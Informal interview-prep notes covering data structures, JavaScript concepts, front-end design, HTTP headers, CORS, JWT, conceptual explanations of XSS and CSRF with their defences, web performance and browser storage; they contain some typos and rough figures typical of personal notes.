-> needs preprocessing and takes up memory for each word so for n words and k letters can be O(nk) space
-> each node may contain value which may be null (can be like word/endOfWord), array of references to child nodes which may be null
-> to delete: find node that contains value for that key and set its value to null; then check all its references - if all null then the character node can be removed otherwise, leave it
-> takes up a lot of space with empty/null pointers, doesn't need a hash function
-> Time Complexity: O(k) to search for words/insert a word/remove

- Fenwick Tree: binary indexed tree, implemented as implicit data structure using an array
-> given an index in array representing a vertex, the index of a vertex's parent or child is calculated through bitwise operations on the binary representation of its index
-> each element of array contains pre-calculated sum of a range of values and by combining sum with additional ranges encountered during an upward traversal to the root,
the prefix sum is calculated
-> parent(i) = i-i & (-i)
-> Time Complexity:
  Range Sum: O(log(N))
  Update: O(log(N))

- Segment Tree: storing intervals or segments, allows querying which of the stored segments contain a given point
-> Time Complexity:
  Range Query: O(log(N))
  Update: O(log(N))

- Heap: specialized tree that satisfies heap property
-> if A is a parent node of B, then the key (value) of node A is ordered with respect to key of node B with same ordering applying across
entire heap
-> binary heap is a binary tree, all levels completely filled except possibly last level and last level has all keys as left as possible, can be stored
in array
-> when inserting, need to swap nodes out of order; when removing nodes, continue to "bubble down" former root node until no longer violating heap-order
  compare and swap on the way down
-> partially sorted, max/min at root node -> index 0 of array, 2i+1 left child, 2i+2 right child, floor of (n-1)/2 index of current node's parent
-> either min or maxheap i.e. for minheap, the root must be minimum among all keys present in binary heap and same property must be recursively true for all nodes
-> for array format: root element is arr[0]; need level order traversal to achieve array representation (can use BFS with queues)
  for the ith node arr[i]
    arr[i/2] = parent node
    arr[(2*i) + 1] = left child node
    arr[(2*i) + 2] = right child node
-> for heapsort, priority queue (insert, delete, extractmax, decreasekey in O(logN) time)
-> priority queue: each item has priority, higher priorities dequeued first, two items with equal priority dequeued based on order in queue
  implemented easily through binary heaps cause finding max/min priority is O(1) at root; insertion/deletion takes O(logN)
-> applied to CPU scheduling
-> general algorithm of minheap:
-> "max heap" or "min heap"
-> "max heap": the keys of parent nodes are always greater than or equal to those of children and the highest key is in the root node
-> "min heap": keys of parent nodes are less than or equal to those of the children and the lowest key is in the root node
-> Time Complexity:
  Access Max/Min: O(1)
  Insert: O(log(N))
  Remove Max/Min: O(log(N))

- Hashing: map data of an arbitrary size to the data of a fixed size
-> to hash somethings typically takes O(k) where k is size of object being hashed
-> values returned by a hash function are called hash values/codes/hashes; if two keys map to the same value, a collision occurs
-> HashMap - maps keys to values, uses a hash function to compute an index into an array of buckets or slots from which the desired value can be found
-> collision resolution
-> separate chaining - each bucket is independent and contains a list of entries for each index;
the time to find the bucket (constant time) plus the time to iterate through the list
-> open addressing - when a new entry is inserted, teh buckets are examined, starting with the hashed-to-slot and proceeeding in some sequence until an unoccupied slot is found;
refers to the fact that the location of an item is not always determined by its hash value

- Graphs represented as objects and pointers, adjacency matrix, adjacency list
-> ordered pair of G = (V, E) comprising set V of vertices or nodes together with a set E of edges or arcs which are 2-element subsets of V (edge is associated with two vertices and that
association takes the form of the unordered pair comprising those two vertices)
-> undirected graph: graph in which adjacency relation is symmetric, there exists edge from node u to v and also from v to u
-> directed graph: graph in which adjacency relation is not symmetric, there exists and edge from node u to v but it does not imply that there exists an edge from node v to u 
-> representing as edge lists: using an array of two vertex numbers containing the numbers that the edge is incident upon
space is O(E) i.e. [ [0,1], [0,6], [0,8], [1,4], [1,6], [1,9], [2,4], [2,6], [3,4], [3,5],
[3,8], [4,5], [4,9], [7,8], [7,9] ]
  can find a certain edge with linear search in O(|E|) time or if it is sorted lexicographically can be O(log|E|) with binary search
-> adjacency matrix: for a graph with |V| vertices, an adjacency matrix is a |V|x|V| matrix of 0s and 1s, where the entry in row i and column j 
is 1 if and only if the edge (i,j) is in the graph
  if you want edge weights, can put it in (i,j) and represent no edges with null
  can find out whether an edge is present in constant time by just looking at graph[i][j]
  two disadvantanges: 
    1. O(V^2) space even if graph is sparse with relatively few edges
    2. if you want to find out which vertices are adjacent to a given vertex i, you have to look at
    all |V| entries in row i, even if only a small number of vertices are adjacent to vertex i
  for an undirected graph, the adjacency matrix is symmetric: row i, column j is 1 if and only if
  row j and column i is 1; for directed graph the adjacency matrix need not be symmetric
-> adjacency list: combines adjaceny matrix and edge lists
  for each vertex i, store an array of vertices adjacent to it
  typically have an array of |V| adjacency lists, one adjacency list per vertex
  vertex numbers in lists not required to be in any order but helps when in increasing order
  can get to each vertex's adjacency list in constant time
  to find out whether an edge (i,j) is present in graph, we go to i's adjacency list and then look
    for j in i's adjacency list => O(d) where d is the degree of vertex i which could be as high
    as |V| - 1 vertices (adjacent to all other vertices) or as low as 0 (if isolated with no incident edges)
i.e. [ [1, 6, 8],
  [0, 4, 6, 9],
  [4, 6],
  [4, 5, 8],
  [1, 2, 3, 5, 9],
  [3, 4],
  [0, 1, 2],
  [8, 9],
  [0, 3, 7],
  [1, 4, 7] ]
  If the graph is weighted, then each item in each adjacency list is either a two-item array or an object, 
    giving the vertex number and the edge weight.
  To do something to vertex i's adjacent vertices, can easily do a for loop
    var vertex = graph[i];
    for (var j = 0; j < vertex.length; j++) {
        doStuff(vertex[j]);
    }
  How much space? |V| adjacency lists, up to |V|-1 vertices in those lists; for an undirected graph,
    the adjacency lists contain 2|E| elements cause each edge appears twice in adjacency lists (i,j) and (j,i)
    for a directed graph, the adjacency lists contain a total of |E| elements, one element per directed edg

High Level JavaScript:
-> cross-platform, object-oriented scripting language, works inside host environment like browser
-> client-side JS to control browser and Document Object Model (DOM)
-> server-side JS to manage server like Node.js, communicate with database
-> no distinction between types of objects, inheritance through prototype mechanism, properties and methods added
to any object dynamically
-> variable data types are not declared (dynamic typing, loosely typed), cannot automatically write to hard disk
vs. Java
-> class-based, objects divided into classes and instances with all inheritance through class hierarchy
-> classes and instances cannot have properties or methods added dynamically
-> variable data types must be declared (static typing, strongly typed), can automatically write to disk

-> functional programming: first-class functions, higher-order functions, passing functions as arguments and values,
taking advantage of currying/partial application of functions, can make things more pure (without side effects)
-> prototypal inheritance: OLOO (objects linked to other objects) for mixins, using Object.assign(), delegation, concatenative inheritance,
instance is created by cloning an existing object that serves as a prototype; often instantiated using a factory function or Object.create() which
can benefit from selective inheritance from many different objects
vs. classical inheritance: constructor function instantiates an instance via the "new" keyword, inherits properties from parent class

-> using IIFE/closures around entire contents of file for private namespace and avoid clashes between JS modules and libraries
and allows for easily referenceable alias for a global variable
(function($) { })(jQuery);

-> "use strict" to voluntarily enfore stricter parsing and error handling on code at runtime, prevents accidental globals, eliminates this coercion,
disallows duplicate paramater values, makes eval() safer, throws errors on invalid usage of delete (to remove properties from objects)

-> NaN not equal to itself, typeof null is object, 
function isInteger(x) { return Math.round(x) === x; }

-> event loop, single-thread, web app, in Node.js server and browser

-> functional paradigm: function evaluation to manage program state, immutable data, avoidance of changing program state
by using higher-level functional abstractions i.e. forEach() loop
vs. imperative: transparency forced by lower-level command/instruction statements i.e. for loop

-> Shim: any piece of code that performs interception of an API call and provides a layer of abstraction
   Polyfill: type of shim that retrofits legacy browsers with modern HTML5/CSS3 features usually using JavaScript

-> Event Propagation
when an event occurs in an element inside another element and both elements have registered a handle for that event, event propagation mode determines
in which order elements receive event
bubbling: event is first captured and handled by innermost element and then propagated to outer elements
capturing: event is first captured by outermost element and propagated to inner elements
  elem.addEventListener(type, handler, true) -> rarely used, some events don't bubble like onfocus/onblur but can be captured

-> JavaScript sort() function => different browsers feature different sort algorithms
depending on type of array, different sort methods used
Webkit implements some variation of quicksort called intro sort for numeric arrays;
for non-numeric arrays it uses mergesort

-> what is "this"?
at time of execution of every function, JS engine sets property to function called "this" which refers to the current
execution context; always refer to an object and depends on how function is called
1. in global context or outside a function "this" refers to window object
2. inside IIFE and you "use strict", this is undefined unless you pass window into IIFE
3. while executing function in context of an object, object becomes value of this
4. inside setTImeout function, value of this is window object
5. if you use a constructor by using new keyword to create an object, the value of this will refer to newly created object
6. can set value of this to any arbitrary object by passing the object as first parameter to bind, call, apply
7. for DOM event handler, value of this would be the element that fired the event

-> Shadow DOM: encapsulated DOM subtree from rest of page, useful for plug and play widgets, document stylesheet can't apply to encapsulated subtree

-> using async (in scripts): HTML parsing doesn't stop during file is fetched but once it's fetched, HTML parsing stops to execute script

-> using defer (in scripts): downloads JS during HTML parsing and executes JS only when HTML parsing is done

-> document fragments and node caching
DocumentFragments allow developers to place child elements onto an arbitrary node-like parent, allowing for node-like interactions without a true root node
  helps with speed by letting developers produce structure without doing so within visible DOM
  acts like pseudo-DOM node
Can cache references to nodes as each time you query for them it goes through a DFS traversal of the document to get all matching ones
  can keep reference to parent element to query from

Responsive Design: changing an element's dimensions based on browser width size
Adaptive Design: changing an element's dimensions based on specific break points

System Design:
  Rendering - client-side (CSR) vs. server-side (SSR) and universal rendering
  Layout - building out components, consistent markup, style guide
  State management - unidirectional data flow or two-way data binding
  Async Flow - communicating with server, XHR vs. bidirectional calls; considering older browsers to choose between hidden iframes,
  script tags or XHR for messaging or just use WebSockets or server-sent events
  Separation of Concerns: Model-View-Controller (MVC), Model-View-View-Model(MVVM), Model-View-Presenter(MVP)
  Multi-device support (web, mobile, hybrid, responsive design)
  Asset Delivery (separate codebases and different pipelines to release changes to production), consider how assets built with dependencies
  like through code splitting, tested (unit and integration tests) and deployed; vend assets through CDN or inline them to reduce network latency

Single Page App Design Patterns:
- Router (Static like Backbone/Marionette AppRouter/Dynamic like react-router-v4)
  user navigation and following different links with possible wildcards, query params
- HTTP Library (i.e. axios, Promise-based async libraries, XHR) - making requests to backend services/databases
  possibly use something like GraphQL, other AJAX requests through jQuery/native fetch, etc.
- User Interface Layer (i.e. React, AngularJS, Backbone)
- State Manager (i.e. Redux, Angular, Vuex)
- Business Logic

Progressive Enhancement:
basic markup created, geared towards lowest common denominator of browser software functionality, all enhancements like JS, CSS,
SVGs will be added to presentation and behavior of page but all externally linked to prevent data unusable by certain browsers from being unnecessarily downloaded

Gradual Degradation:
designers create webpages for latest browsers that would also work well in older versions of browser software

Web Security Issues:

- XSS (Cross-site Scripting): doesn't need an authenticated session and can be exploited when the vulnerable website
doesn't do the basics of validating or escaping input;
-> can send inputs via request parameters or client side input fields (cookies, form fields, url params)
-> can be written back to screen, persisted in database or executed remotely
-> to run untrusted code upon rendering
- allows attacker to inject into a website malicious client-side code; one can bypass controls and impersonate users
- usually occur when data enters a web app through an untrusted source (most often a web request) or dynamic content sent to web user
without being validated for malicious content
- commonly include transmitting private data like cookies or session information, redirecting victim to webpage controlled by attacker or
performing malicious operations on user's machine under guise of vulnerable site
- three categories: stored (persistent), reflected (non-persistent), DOM-based
-> stored XSS attacks - injected script is stored permanently on target servers; victim then retrieves malicious scripts from server when browser sends a request for data
-> reflected XSS attacks - user tricked into clicking malicious link, submitting a form or browsing to malicious site, injected code travels to vulnerable website. web server 
reflects injected script back to user's browser as an error/search result/server response. brwoser executes code because it assumes response is from
a "trusted" server which user has already interacted with
-> DOM-based XSS attacks - payload is executed as a result of modifying DOM environment in victim's browser used by original client-side script; page does not change but client side
code contained in page runs in an unexpected manner because of malicious modifications to DOM environment

- XSRF (Cross-site Request Forgery): happens in authenticated sessions when server trusts user/browser
-> can place a malicious link embedded in another link or a zero byte image with bad src;
-> if you have multiple tabs open and you click the malicious links, attacks can happen in background as if you clicked from the other tab
because your session is still active in browser and browser has session id
-> to prevent this: another server supplies unique token generated and appended in requests and is not known to browser like session id
and additional validation at server for the CSRF token to be sure attacker manipulated link doesn't work
-> to hijack authentication, causes web app to process an attacker-specified request within context of victim's authenticated session
-> i.e. loading img with bad src and passes along authentication with the request 
- attack that impersonates trusted user and sends a website unwanted commands like including malicious parameters in URL behind a link that purports to go 
somewhere else
-> check standard headers to verify request is same origin (Access-Control-Allow-Origin - CORS headers)
-> check CSRF token i.e. custom headers X-Requested-With: XMLHttpRequest, encyrpted token pattern, double cookie defense, per request CSRF tokens

- Using JWT (JSON Web Tokens)
-> open, industry standard RFC 7519 method for representing claims securely between two parties
-> compact and self-contained way for securely transmitting info between parties as JSON object which can be verified and trusted because it is digitally signed
-> can be signed using secret with HMAC algorithm or public/private key pair using RSA
-> can be encrypted to hide claims from parties
-> can be signed tokens to verify integrity of claims contained within it; public/private key paris signature certifies tha tonly party holding private key is one that signed it
-> compact: send through URL, POST parameter, HTTP header => faster transmission
-> self-contained: payload contains all required information about user, avoiding need to query database more than once
-> used for authentication i.e. once user is logged in, each subsequent request will include JWT, allowing user to access routes, services, and resources that are permitted with
that token; Single Sign On with small overhead and used across different domains
-> used for information exchange: can be sure senders are who they say they are, signature calculated using header and payload to verify content hasn't been tampered with
-> structure: header, payload, signature (xxxxx.yyyyy.zzzzz)
-> header: type of token = JWT and hashing algorithm used like HMAC SHA256 or RSA
{ // Base64Url encoded
  "alg": "HS256",
  "typ": "JWT"
}
-> payload: contains claims (statements about entity like user and additional metadata)
  can be registered, public, and private claims
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
-> signature: takes encoded header and encoded payload, a secret, algorithm specified in header, and signs it
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
-> output is three Base64-URL strings separated by dots that can be easily passed in HTML and HTTP environment while being more compact when compared to XML-based standards such as SAML
-> authentication case: when user successfully logs in using credentials, JWT returned and must be saved locally (typically in localStorage but cookies can be used) rather than creating session
in server and returning a cookie
  whenever user wants to access protected route or resource, user agent should send JWT, typically in Authorization header using Bearer schema
  i.e. Authorization: Bearer <token> => stateless auth mechanism as user state is never saved in server memory
  and server's protected routes will check for valid JWT in Authorization header and if it's present, user will be allowed access to protected resources
  -> can now rely on data APIs that are stateless, doesn't matter which domain serving your APIs so CORS won't be an issue as it doesn't use cookies
  -> should not put secret information within token as all information is exposed to users or other parties though they can't change it
  i.e. Sample Flow
  1. POST /users/login with username and password
  2. Create a JWT with a secret
  3. Returns JWT to browser
  4. Sends JWT on Authorization Header
  5. Check JWT signature. Get user information from JWT
  6. Sends reponse to client
-> Why use this? JSON less verbose than XML, can be signed RSA style, JSON parsers mapping directly to objects easily rather than SAML,
used at Internet scale on multiple platforms especially mobile
-> can store token on localStorage (data persists until explicitly deleted, changes saved and available for all current and future visits to the site)
  on sessionStorage(changes made are saved and available on current page as well as future visits to site on same window but once window is closed, storage is deleted)
  disadvantages of Web Storage:
    sandboxed to specific domain and its data cannot be accessed by any other domain including sub-domains
    accessible through JS on same domain so any JS running on site will have access to web storage and can be vulnerable to XSS
    must ensure JWT is always sent over HTTPS and never HTTP
  on cookies: can control its lifetime say after browser is closed (session cookie), server side check and implement expiration, can be persistent (not destroyed after browser is closed with expiration)
    can be read by both JS and server side code or only server side if HttpOnly flag is set
  disadvantages of cookie:
    max size of cookie is only 4kb, so it's tough if you have many claims
    vulnerable to CSRF but one can check HTTP Referer and Origin header
    difficult to implement for cross-domain access, have additional properties (Domain/Path) that can be modified to allow you to specify where cookie is allowed to be sent

HTTP Headers:
- allow the client and server to pass additional information with the request or the response
- request header consists of case-insensitive name followed by a colon ':'; custom proprietary headers can be added using 'X-' prefix
but deprecated in June 2012
- headers grouped according to contexts
-> general header: apply to both requests and responses with no relation to data eventually transmitted in body
-> request header: contains more information about resource to be fetched or about client itself
-> response header: additional information about response like its location or about the server itself
-> entity header: more information about body of entity like its content length or MIME-type
- can be grouped according to how proxies handle them
-> end-to-end headers: headers must be transmitted to final recipient of the message like the server for a reuqest or client for a response
and intermediate proxies must retransmit end-to-end headers unmodified and caches must store them
-> hop-by-hop headers: meaningful only for a single transport-level connection and must not be retransmitted by proxies or cached
like Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization, Transfer-Encoding, Upgrade
- Authentication: WWW-Authenticate, Authorization (contains credentials to authenticate a user agent with server), Proxy-Authenticate, Proxy-Authorization
- Caching: Age (time in seconds object has been in proxy cache), Cache-Control (specifies directives for cachine mechanisms in both requests and responses),
Expires (response considered stale after this), Pragma (implementation-specific header), Warning (possible problems)
- Client Hints: Accept-CH, Content-DPR, DPR, Downlink, Save-Data, Viewport-Width, Width
- Conditionals: Last-Modified (validator to compare several versions of same resource), less accurate than ETag but easier to calculate in some environments and
conditional requests like If-Modified-Since and If-Unmodified-Since use this to change behavior of request, ETag - unique string identifying version of resource and
conditional requests using If-Match and If-None-Match use this to change behavior of request
If-Match, If-None-Match, If-Modified-Since, If-Unmodified-Since
- Connection Management: Connection (controls whether network connection stays open after current transaction finishes), Keep-Alive (controls how long a persistent connection should stay open)
- Content negotiation: Accept (informs server about types of data that can be sent back, it is MIME-type), Accept-Charset (charset client can understand), Accept-Encoding (encoding algorithm to server like compression
that can be used on resource sent back), Accept-Language (language server sends back)
- Controls: Expect, Max-Forwards
- Cookies: Cookie (contains stored HTTP cookies previously sent by server with Set-Cookie header), Set-Cookie (send cookies from server to user agent)
- CORS: Access-Control-Allow-Origin (indicates whether response can be shared), Access-Control-Allow-Credentials (indicates whether response to request can be exposed when credentials flag is true),
Access-Control-Allow-Headers (used in response to preflight request to indicate which HTTP headers can be used when making actual request), Access-Control-Max-Age (how long results of preflight request can be cached),
Origin (where fetch originates from)
- Do Not Track: DNT, Tk
- Downloads: Content-Disposition (response header if resource transmitted should be displayed inline) or should be handled like a download and browser should present a 'Save As' window
- Message body information: Content-Length (size of entity-body), Content-Type (media type of resource i.e. json), Content-ENcoding, Content-Language, Content-Location
- Proxies: Forwarded, X-Forwarded-For/Host/Proto, Via
- Redirects: Location (URL to redirect page to)
- Request Context: From (internet email address for human user who controls requesting user agent), Host (specifies domain name of server for virtual hosting and optionally the TCP port number on which the server is listening),
Referer (address of previous web page from which a link to the currently requested page was followed), Referrer-Policy, User-Agent(characteristic string that allows network protocol peers to identify the application
type, operating system, software vendor or software version of the requesting software user agent)
- Response Context: Allow (lists the set of HTTP request methods supported by a resource), Server: (software used by origin server to handle request)
- Range requests: Accept-Ranges, Range, If-Range, Content-Range
- Security: Content-Security-Policy (CSP) - controls resources the user agent is allowed to load for a given page, Expect-CT (opt in to enforce Certificate Transparency requirements to prevent use of misissued certificates for that site from
going unnoticed), Public-Key-Pins (HPKP) - associates specific cryptographic public key with certain web server to decrease the risk of MITM attacks with forged certificates,
Strict-Transport-Security (HSTS) - force communication using HTTPS instead of HTTP, Upgrade-Insecure-Requests, X-Content-Type-Options - disables MIME sniffing and forces browser to use the type given in Content-Type,
X-Frame-Options(XFO) - indicates whether browser should be allowed to render a page in <frame>/<iframe>/<object>, X-XSS-Protection - enables cross-site scripting filtering
- ETag: opaque-to-the-useragent value as a validator response header, can be used to help invalidate cache through If-None-Match in header of future requests - identifier for specific version of resource
- Status Codes: 200 OK, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 500 Internal Server Error
- Transfer-Encoding: specifies form of encoding used to safely transfer entity to user, hop-by-hop header
i.e. chunked, compress, gzip, identity, deflate
- Content-Encoding: if you want to compress data over whole connection
- Compression: for file formats (loss-less/lossy), general encryption at HTTP level (resource transmitted compressed from end to end), at connection level between
two nodes of an HTTP connection
- Conditional Requests: result and success of request changed by comparing affected resources with the value of validator and can be useful
for validating content of a cache, verifying integrity of document; executed differently based on value of specific headers
  for safe methods like GET, can be used to send back document to spare bandwidth
  for unsafe methods like PUT, can be used to upload document only if original is same as the one stored on server
- Caching: reduce latency and network traffic by reusing previously fetched resources
  shared cache by more than one user vs. private cache for single user
  primary cache key consists of request method and target URI like for 200 responses, 301 redirects, 206 incomplete results
  use Cache-Control header to specify directives for requests and responses
  i.e. Cache-Control: private/public or no-store
  i.e. Cache-Control: max-age=31436000 // max amount of time a resource will be considered fresh, Expires is relative to time of request
  Cache-Control: must-revalidate // must verify status of stale resources before using it and expired ones should not be used
  caches have finite storage so items are periodically remove through cache eviction
- Authentication
  server responds with 401 Unauthorized and provides information on how to authorize with a WWW-Authenticate response header containing at least one challenge
  a client that wants to authenticate itself with a server can then do so by including an Authorization request header field with the credentials
  usually a client will present a password prompt to the user and will then issue the request including correct Authorization header


Cross-Origin Resource Sharing (CORS):
- mechanism that uses additional HTTP headers to let a user agent gain permission to access selected resources from a server on a different origin (domain) than the site currently in use
- user agent makes a cross-origin HTTP request when it requests a resource from a different domain, protocol, or port than the one from which the current document originated
i.e. HTML page served from http://domain-a.com makes <img> src request to http://domain-b.com/image.jpg, loading up images and scripts from separate domains like content delivery networks (CDN)
- XMLHttpRequest and Fetch API follow same-origin policy => web app using those APIs can only request HTTP resources from the same domain the application was loaded from unless CORS headers are used
- CORS mechanism supports secure cross-domain requests and data transfers between browsers and web servers

JSONP:

IFrame Policies:

Web Performance Gains:
- Compress diligently (GZip, Brotli)
- Cache effectively through HTTP and Service Workers
- Minify and optimize
- Preresolve DNS for critical origins
- Preload critical resources
- Respect data plans
- Stream HTML responses
- Make fewer HTTP requests
- Have a font loading strategy
-> font-display: optional (if you can't do it fast have a fallback)
-> minimize font download by limiting range of characters you're loading
-> minimize FOIT (flash of invisible text) by using <link rel="preload">
- Send less JS through code splitting for smaller bundler sizes
- Lazy-load non-critical resources
- Route-based chunking
-> CommonChunksPlugin (Webpack)
-> Dynamic import()
- Optimize vendor libraries
-> NODE_ENV=production
- Fewer Moment.js locales (ContextReplacementPlugin())
- Transpile less code (babel-preset-env + modules: false, useBuiltins: true, Browserlist)
- Library sharding
- PRPL pattern
-> Push the minimal code for the initial route (request and push/preload critical scripts)
-> Render route and get interactive
-> Pre-cache using Service Workers to cache remaining resources
-> Lazy-load async (split) routes before navigating to other routes
- Tree-shaking (Webpack, Rollup) to remove dead code
- Serve modern browsers ES2015 (babel-preset-env)
- Scope hoisting (Webpack)
-> modules get wrapped into functions isolating their scope while imports get transpiled into variables holding result of 
Webpack require function, wrapped modules go to an array at end of our bundle
-> each import translates into an extra function call and a property access to modules array
-> scope hoisting to detect where these import chaining can be flattened and converted into one inlined function without compromising our code
-> this saves an extra function call and access to the modules array so code runs faster
-> need to use ModuleConcatenationPlugin
- don't ship dev code to prod

- Progressive Web Apps (using service workers to cache assets and have an offline experience and IndexedDB for transactions/data store)
-> Service Workers
  act as proxy servers that sit between web applications, browser, and network when available; intercept requests, update assets on server, create offline experience,
  allow access to push notification and background sync APIs

  event-driven worker registered against origin and path, takes form of JS file that can control webpage associtaed with it, intercepting and modifying navigation and resource requests
  and caching resources

  run in a worker context: no DOM access, runs on different thread to main JS so it is not blocking, designed to be fully async
  (can't use synchronous XHR or localStorage here)

  run over HTTPs only to prevent man in middle attacks, makes heavy use of promises

  first registered using ServiceWorkerContainer.register() method to download service worker to client and attempt to install/activate for URLs accessed by user inside
  whole origin or subset specified by you

  lifecycle of download every 24 hours, install based on newly downloaded files, activate when no other pages loaded still using old service worker
  but one can use ServiceWorkerGlobalScope.skipWaiting() and existing pages can be claimed by active worker using Clients.claim()

  can listen for InstallEvent to prepare service worker for usage when this fires like creating cache using built in storage API and placing assets inside it you'll
  want for running app offline; activate event for you to clean up old caches and other things from previous version of service worker

  can response to requests using the FetchEvent event and cna modify response to these requests in any way you want using FetchEvent.respondWith method

  use cases: background data sync, responding to resource requests from other origins, centralized updates to expensive-to-calculate data like geolocation or gyroscope
  so multipe pages can make use of one set of data, client-side compiling and dependency management, hooks for background services, custom templating based on certain URL patterns,
  performance enhancements for pre-fetching resources user is likely to need in near future

  app shell model: minimal HTML, CSS, and JS required to power user interface and when cached offline can ensure instant, reliably good performance to users on repeat visits;
  shell not loaded from network every time user visits; aggressively caching shell using service worker, dynamic content loads for each page using JS, get initial HTML onto screen
  should load fast, use little data as possible, use static assets from local cache, separate content from navigation, retrieve and display page-specific content, optionally cache dynamic content

- Using a Content Delivery Network to cache assets at edge locations in different regions i.e. AWS CloudFront

- Notes:
  high performing sites engage and retain users better (Google Score Card and Impact Calculator), better user experience
  audit what resources you send to users: do you really need Bootstrap or Foundation to build UI? can just use CSS Flexbox and Grid
  -> CSS is render blocking resource and overhead of CSS framework can delay rendering significantly
  -> JS libraries convenient but not always necessary like jQuery i.e. querySelector, querySelectorAll; event binding with addEventListener, classList, setAttribute, getAttribute
  using Preact rather than React, Zepto rather than jQuery
  -> not all websites need to be SPAs as they make extensive use of JS (most expensive resource we serve on web byte for byte) - needs to be downloaded, parsed, compiled, executed
    can possibly do HTTP caching and use service worker
  -> can fix how you send resources like migrating to HTTP/2 to address concurrent request limits and lack of header compression, expedite delivery of resources using resource hints
  like rel=preload to allow early fetches of critical resources before browser would discover them to lower time to interactive, rel=preconnect for resources on third party domains
  -> HTTP/1 led to bundling styles and scripts but HTTP/2 may have cheaper multiple simultaneous requests; code splitting in webpack to limit amount of scripts downloaded to only what is
  needed by current page or view, separate CSS intos maller template or component-specific files
  -> mind how much data you spend: minify text assets (removing unnecessary whitespace, comments, other content), uglification in JS (shortening variable and method names),
  configure server to compress resources (GZIP, Brotli compression), optimize images/serving alternative formats like WebP for smaller file size, send images responsively (proper size for certain screen widths)
  by adding srcset attribute to <img> element to specify array of images the browser can choose from or <picture> to choose optimal image format for browser, client hints for network/device characteristics

  - RAIL: response, animation, idle, load (300ms to 1000ms)
  -> respond in under 50m, animate and produce a frame in 10ms or less, maximize idle time, load: deliver content and become interactive in under 5 seconds
  -> measure through Chrome DevTools - throttle CPU/network, view main thread activities, analyze FPS, view network requests, view paint events and scroll performance issues in real-time, Lighthouse, WebPageTest

  Rendering Performance:
  -> most devices had 60fps, all work needs to be completed inside 10ms; otherwise frame rate drops and content judders on screen = jank
  -> pixel pipeline:
    1. JS: to handle work resulting in visual changes like animate function in jQuery, adding DOM elements to page dynamically though there are CSS animations too
    2. Style calculations: figuring out which CSS rules apply to which elements based on matching selectors
    3. Layout: calculates how much space each element takes up and where it is on screen and one element can affect otherwise
    4. Paint: process of filling in pixels and drawing out text, colors, images, borders and shadows, done onto multiple surfaces called layers
      - creating a list of draw calls and "rasterization" = filling in pixels
    5. Compositing: multiple layers need to be drawn onto screen in correct order so page renders correctly i.e. overlapping elements

    three ways pipeline normally plays out
    1. JS/CSS > Style > Layout > Paint > Composite
      if you change a layout property like changing an element's geometry like width, height, position with left or top, browser will have to check
      all other elements and "reflow" the page and any affected areas will need to be repainted and final painted elements will need to be composited back together
    2. JS/CSS > Style > Paint > composited
      if you change a "paint only" property like a background image, text color, shadows that do not affect layout of page, then browser skips layout but will do paint
    3. JS/CSS > Style > Composite
      if you change a property that requires neither layout nor paint and browser jumps to compositing = cheapest and most desirable for high pressure points in app's lifecyle like
      animations or scrolling

    optimizing JS execution
      -> avoid setTimeout or setInterval for visual updates; use requestAnimationFrame instead; move long-running JS off main thread to web workers
      -> use micro-tasks to make DOM changes over several frames
      -> use Chrome DevTools' Timeline and JS Profiler to assess impact of JS

    reduce scope and complexity of style calculations
      -> adding and removing DOM elements, changing attributes, classes or through animation will cause browser to recalculate element styles
      and in many cases layout or reflow the page or parts of it = computed style calculations
      1. creating a set of matching selectors (browser figuring out which classes, pseudo-selectors and IDs apply to any given element)
      2. taking all style rules from matching selectors and figuring out what final styles element has
      -> reduce complexity of selectors through use of class-centric methodology like Bellman
      -> reduce number of elements on which style calculation must be calculated
        worst case is number of element multiplied by selector count because each element needs to be at least checked once against every style to see if it matches
      
      avoid large, complex layouts and layout thrashing
      -> concerns about number of elements that require layout, complexity of layouts
      -> layout normally scoped to whole document, number of DOM elements will affect performance so you should avoid triggering layout wherever possible
      -> assess layout model performance i.e. Flexbox is faster than older Flexbox or float-based layout models or position elements
      -> avoid forced synchronous layouts and layout thrashing; read style values then make style changes

      simplify paint complexity and reduce paint areas
      -> changing any property apart from transforms or opacity always triggers paint
        triggering layout always triggers paint; others like background/textcolor/shadows
      -> paint is often the most expensive part of pixel pipeline so avoid it where you can
      -> reduce paint areas through layer promotion and orchestration of animations
        browsers union together two areas that need painting and can result in entire screen being repainted i.e. fixed header and rest of body
        orchestrate animations and transitions to not overlap as much
      -> use DevTools paint profiler to assess paint complexity and cost, reduce where you can

      stick to compositor-only properties and manage layer count
      -> stick to transform and opacity changes for animations
      -> promote moving elements with will-change or translateZ
      -> avoid overusing promotion rules; layers require memory and management

      debounce input handlers
      -> avoid long-running input handlers as they can block scrolling
      -> don't make style changes in input handlers
      -> debounce handlers; store event values and deal with style changes in the next requestAnimationFrame callback
        editing and then reading styles can result in layout thrashing (read first then edit styles)


Local Storage:
- read-only window.localStorage property allows you to access Storage object for Document's origin
- stored data is saved across browser sessions, has no expiration time
- around 5MB, only string data (though you can serialize everything), synchronous, can't be used by web workers
- any JS code on page can access local storage and no data protection
- can store public, insensitive information, for string data/not larger than 5MB and not used in high-performance app
- beware of XSS if you store session/user sensitive information; attacker running JS on your website and sending local storage information
to their own domain
-> if website contains any third party JS code from source outside domain i.e. bootstrap, jQuery, React, ad network, Google Analytics, tracking code,
you are at risk for other JS running on you website if say any of those sources are compromised
-> don't store JSON Web Tokens (session data) in local storage as sattackers can make requests to website on your behalf
-> to store sensitive data (user IDs, session IDs, JWTs, personal/credit card information, API keys), always use a server-side session
-> when logging into website, create session identifier and store it in cryptographically signed cookie
-> make sure web framework for cookies is setting httpOnly flag as it makes it impossible for a browser to read any cookies and also set SameSite=strict cookie flag
to prevent CSRF attacks as well as secure=true flag to ensure cookies can only be set over an encrypted connection
-> each time user makes a request to your site, use session ID extracted from cookie sent to you to retrieve accounts details from db or cache
- Caveats with Private Browsing Mode:
  Safari returns null for any item set using localStorage.setItem either before or during the private browsing session. 
  In essence, neither sessionStorage or localStorage are available in private brosing mode

  Chrome and Opera return items set previous to private ("incognito") browsing, but once private browsing commences, 
  treats localStorage like sessionStorage (only items set on the localStorage by that session will be returned) but like localStorage for other private windows and tabs

  Firefox, like Chrome will not retrieve items set on locaStorage prior to a private session starting, but in private browsing treats localStorage like sessionStoroage for non private windows and tabs, but like localStorage for other private windows and tabs

Session Storage:
- window.sessionStorage, data stored in sessionStorage gets cleared when page session ends or when page is closed, specific to protocol of the page


Cookies:
